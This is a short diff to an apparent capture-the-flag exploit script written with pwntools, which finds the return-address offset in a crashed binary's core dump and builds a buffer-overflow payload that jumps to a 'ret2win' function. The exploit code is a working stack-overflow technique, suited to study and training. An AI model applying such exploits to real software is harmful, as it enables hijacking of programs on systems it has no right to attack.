@@ -16,7 +16,7 @@ def start(argv=[], *a, **kw):
 # Specify your GDB script here for debugging
 gdbscript = '''
 init-peda
-continue
+break
 '''.format(**locals())
 
 # Set up pwntools for the correct architecture
@@ -60,10 +60,14 @@ info("%#x stack", stack)
 pattern = core.read(stack, 4)
 info("%r pattern", pattern)
 
+# Print out the address of EIP at the time of crashing
+rip_offset = cyclic_find(pattern)
+info('located RIP offset at {a}'.format(a=rip_offset))
+
 # Craft a new payload which puts the "target" address at the correct offset
-payload = flat(
+payload = fit({
     pattern: elf.symbols.ret2win
-)
+})
 
 # Send the payload to a new copy of the process
 io = start()
